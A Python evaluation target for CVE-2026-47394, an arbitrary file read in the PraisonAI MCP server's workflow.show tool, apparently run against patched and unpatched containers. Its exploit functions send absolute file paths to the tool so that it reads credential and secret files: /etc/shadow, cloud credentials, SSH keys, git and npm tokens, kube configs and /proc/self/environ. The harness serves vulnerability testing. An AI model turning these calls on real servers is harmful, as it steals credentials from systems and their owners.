"""CVE-2026-47394: PraisonAI MCP server arbitrary file read through praisonai.workflow.show.

praisonai.workflow.show (and workflow.validate / deploy.validate) open the caller-supplied
file_path with no containment (praisonai/mcp_server/adapters/cli_tools.py), and the tools/call
dispatcher _handle_tools_call (mcp_server/server.py) forwards unchecked **arguments, so a single
call reads any file the server process can read: reach = arbitrary_read. 4.6.40 resolves the path
through _resolve_cwd_yaml_path, which rejects a separator, a leading dot or a non-.yaml suffix and
confines the read to the working directory. The server lists 86 tools in pages of 50, the tool on
the second page.
"""

import re
from collections.abc import Awaitable, Callable

from evals.cve_environments import command_injection_env
from evals.cve_grammar import MechanismClass
from evals.cve_places import Place, Places, PlantKind
from evals.cve_planting import PlantingHost, SymbolicUser
from evals.cve_planting_base import LayoutMount
from evals.cve_planting_spec import resolve_container_path
from evals.cve_targets import CVETarget
from mcp_auditor.domain.ports import MCPClientPort

# The checkout, the working directory the patched version confines reads to; the benign call
# reads a bare filename relative to it.
WORKING_DIRECTORY = "/srv/app"

TOOL = "praisonai.workflow.show"

KEPT_PLACES: tuple[str, ...] = (
    "etc-shadow",
    "container-hostname",
    "aws-credentials",
    "gcloud-adc",
    "azure-profile",
    "ssh-private-key",
    "shell-history",
    "git-credentials",
    "npmrc",
    "gh-hosts",
    "docker-config",
    "kube-config",
    "pgpass",
    "mysql-client-cnf",
    "mongorc",
    "mysql-system-cnf",
    "proc-environ",
    "run-secrets",
    "k8s-sa-token",
    "etc-hosts",
    "auth-log",
)

# Every exploit sends an absolute path, which contains a separator, exactly what the patch
# rejects; the benign call sends a bare filename.
AIM = re.compile(r"/")


def _read_paths(place: Place) -> tuple[str, ...]:
    if place.kind is PlantKind.HOSTNAME:
        return ("/etc/hostname",)
    if place.kind is PlantKind.ENV:
        return ("/proc/self/environ",)
    coordinates = place.coordinates
    if coordinates.paths is not None:
        raws = coordinates.paths
    elif coordinates.path is not None:
        raws = (coordinates.path,)
    else:
        raise ValueError(f"{place.id}: a file place with no path coordinate")
    return tuple(resolve_container_path(raw, WORKING_DIRECTORY) for raw in raws)


def _exploit(place_id: str) -> Callable[[Places, MCPClientPort], Awaitable[None]]:
    async def run(places: Places, client: MCPClientPort) -> None:
        for path in _read_paths(places[place_id]):
            await client.call_tool(TOOL, {"file_path": path})

    return run


async def _benign(places: Places, client: MCPClientPort) -> None:
    # The checkout holds no agents.yaml, so both versions answer "File not found" without error.
    await client.call_tool(TOOL, {"file_path": "agents.yaml"})


TARGET = CVETarget(
    cve_id="CVE-2026-47394",
    severity="CVSS 7.5 (v3.1, placeholder)",
    mechanisms=frozenset({MechanismClass.READ_OUTSIDE_SCOPE}),
    aim=AIM,
    reaches=frozenset({"arbitrary_read"}),
    kept_places=KEPT_PLACES,
    images=("holdout-2026-47394-praisonai",),
    server_image="holdout-2026-47394-praisonai",
    patched_image="holdout-2026-47394-praisonai-patched",
    planting_host=PlantingHost(
        user=SymbolicUser.UNPRIVILEGED,
        working_directory=WORKING_DIRECTORY,
        has_network=False,
        layout_mount=LayoutMount.READ_ONLY,
    ),
    builder=command_injection_env,
    exploits=tuple(_exploit(place_id) for place_id in KEPT_PLACES),
    benign=_benign,
    awaited_capability=None,
    note=(
        "Arbitrary file read: praisonai.workflow.show opens the caller-supplied file_path with no "
        "containment and returns its contents in the tool response."
    ),
    tools_filter=None,
)
